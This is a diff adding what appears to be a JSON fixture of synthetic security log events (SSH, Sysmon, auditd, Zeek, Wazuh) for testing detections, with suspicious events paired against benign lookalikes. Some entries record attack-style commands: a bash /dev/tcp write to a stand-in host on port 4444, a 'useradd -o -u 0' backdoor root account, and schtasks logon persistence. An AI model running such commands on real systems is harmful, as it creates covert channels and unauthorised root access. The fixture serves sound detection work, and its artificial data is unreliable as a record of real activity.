@@ -1,0 +1,175 @@
+{
+  "events": [
+    {
+      "source": "linux_auth",
+      "sensor": "auth-01",
+      "payload": "2026-11-15T09:00:00Z edge-01 sshd[1200]: Failed password for analyst from 192.0.2.45 port 51000 ssh2"
+    },
+    {
+      "source": "linux_auth",
+      "sensor": "auth-01",
+      "payload": "2026-11-15T09:00:01Z edge-01 sshd[1201]: Failed password for analyst from 192.0.2.45 port 51001 ssh2"
+    },
+    {
+      "source": "linux_auth",
+      "sensor": "auth-01",
+      "payload": "2026-11-15T09:00:02Z edge-01 sshd[1202]: Failed password for analyst from 192.0.2.45 port 51002 ssh2"
+    },
+    {
+      "source": "linux_auth",
+      "sensor": "auth-01",
+      "payload": "2026-11-15T09:00:03Z edge-01 sshd[1203]: Failed password for analyst from 192.0.2.45 port 51003 ssh2"
+    },
+    {
+      "source": "linux_auth",
+      "sensor": "auth-01",
+      "payload": "2026-11-15T09:00:04Z edge-01 sshd[1204]: Failed password for analyst from 192.0.2.45 port 51004 ssh2"
+    },
+    {
+      "source": "sysmon",
+      "sensor": "sysmon-01",
+      "payload": {
+        "EventID": 1,
+        "UtcTime": "2026-11-15 09:02:00",
+        "Computer": "workstation-07",
+        "User": "forge\\morgan",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGQAZQBtAG8A",
+        "RecordID": "1001"
+      }
+    },
+    {
+      "source": "auditd",
+      "sensor": "audit-01",
+      "host": "edge-01",
+      "payload": "type=SYSCALL msg=audit(1794733380.123:800): success=yes uid=1001 auid=1001 euid=1001 exe=\"/bin/bash\"\ntype=EXECVE msg=audit(1794733380.123:800): argc=3 a0=\"bash\" a1=\"-c\" a2=\"echo demo >/dev/tcp/192.0.2.9/4444\""
+    },
+    {
+      "source": "synthetic",
+      "sensor": "fixture",
+      "payload": {
+        "timestamp": "2026-11-15T09:00:00Z",
+        "host": "workstation-07",
+        "kind": "process",
+        "process": "C:\\Windows\\System32\\schtasks.exe",
+        "command": "schtasks /create /tn LabTask /tr notepad.exe /sc onlogon",
+        "user": "forge\\morgan"
+      }
+    },
+    {
+      "source": "synthetic",
+      "sensor": "fixture",
+      "payload": {
+        "timestamp": "2026-11-15T09:00:00Z",
+        "host": "edge-01",
+        "kind": "process",
+        "process": "/usr/sbin/useradd",
+        "command": "useradd -o -u 0 lab-admin",
+        "user": "analyst"
+      }
+    },
+    {
+      "source": "linux_auth",
+      "sensor": "auth-01",
+      "payload": "2026-11-15T09:04:00Z edge-01 sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/bash"
+    },
+    {
+      "source": "zeek",
+      "sensor": "zeek-01",
+      "host": "workstation-07",
+      "payload": {
+        "ts": 1794733500,
+        "uid": "Cdemo01",
+        "id.orig_h": "10.0.0.7",
+        "id.resp_h": "1.1.1.1",
+        "id.resp_p": 4444,
+        "proto": "tcp",
+        "orig_bytes": 620
+      }
+    },
+    {
+      "source": "synthetic",
+      "sensor": "fixture",
+      "payload": {
+        "timestamp": "2026-11-15T09:00:00Z",
+        "host": "lab-01",
+        "kind": "process",
+        "process": "C:\\Windows\\powershell.exe",
+        "command": "powershell -File inventory.ps1"
+      }
+    },
+    {
+      "source": "synthetic",
+      "sensor": "fixture",
+      "payload": {
+        "timestamp": "2026-11-15T09:00:00Z",
+        "host": "lab-01",
+        "kind": "process",
+        "process": "/bin/bash",
+        "command": "bash -c uptime"
+      }
+    },
+    {
+      "source": "synthetic",
+      "sensor": "fixture",
+      "payload": {
+        "timestamp": "2026-11-15T09:00:00Z",
+        "host": "lab-01",
+        "kind": "process",
+        "process": "C:\\Windows\\schtasks.exe",
+        "command": "schtasks /query"
+      }
+    },
+    {
+      "source": "synthetic",
+      "sensor": "fixture",
+      "payload": {
+        "timestamp": "2026-11-15T09:00:00Z",
+        "host": "lab-01",
+        "kind": "process",
+        "process": "/usr/sbin/useradd",
+        "command": "useradd -u 1002 developer"
+      }
+    },
+    {
+      "source": "linux_auth",
+      "sensor": "auth-01",
+      "payload": "2026-11-15T09:04:00Z edge-01 sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/id"
+    },
+    {
+      "source": "zeek",
+      "sensor": "zeek-01",
+      "host": "workstation-07",
+      "payload": {
+        "ts": 1794733500,
+        "uid": "Cdemo01",
+        "id.orig_h": "10.0.0.7",
+        "id.resp_h": "1.1.1.1",
+        "id.resp_p": 443,
+        "proto": "tcp",
+        "orig_bytes": 620
+      }
+    },
+    {
+      "source": "wazuh",
+      "sensor": "wazuh-manager",
+      "payload": {
+        "id": "demo-wazuh-01",
+        "timestamp": "2026-11-15T09:06:00Z",
+        "agent": {
+          "name": "db-02"
+        },
+        "decoder": {
+          "name": "sshd"
+        },
+        "rule": {
+          "id": "5715",
+          "groups": [
+            "authentication_success"
+          ]
+        },
+        "full_log": "sshd: Accepted publickey for deploy from 192.0.2.50 port 52120 ssh2"
+      }
+    }
+  ]
+}
